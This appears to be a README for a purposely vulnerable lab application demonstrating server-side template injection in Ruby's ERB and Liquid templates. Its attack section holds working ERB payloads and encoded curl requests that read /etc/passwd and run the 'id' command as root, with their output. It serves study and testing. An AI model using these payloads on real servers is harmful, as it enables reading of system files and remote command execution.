# Liquid ERB SSTI (Server-Side Template Injection)

Vulnerability application for Liquid and ERB.

## Run

```
docker-compose build

docker-compose up -d

docker-compose down
```

## Attack

### ERB

```
<%= 7 * 7 %>

# curl 'http://127.0.0.1:4567/erb?name=%3c%25%3d%20%37%20%2a%20%37%20%25%3e'
hi 49
```

```
<%= File.open('/etc/passwd').read %>

# curl 'http://127.0.0.1:4567/erb?name=%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29%2e%72%65%61%64%20%25%3e'
hi root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
(...snip...)
```

```
<%= IO.popen('id').readlines() %>

# curl 'http://127.0.0.1:4567/erb?name=%3c%25%3d%20%49%4f%2e%70%6f%70%65%6e%28%27%69%64%27%29%2e%72%65%61%64%6c%69%6e%65%73%28%29%20%25%3e'
hi ["uid=0(root) gid=0(root) groups=0(root)\n"]
```

### Liquid

```
{{ 7 | times: 7 }}

# curl 'http://127.0.0.1:4567/liquid?name=%7b%7b%20%37%20%7c%20%74%69%6d%65%73%3a%20%37%20%7d%7d'
hi 49
```
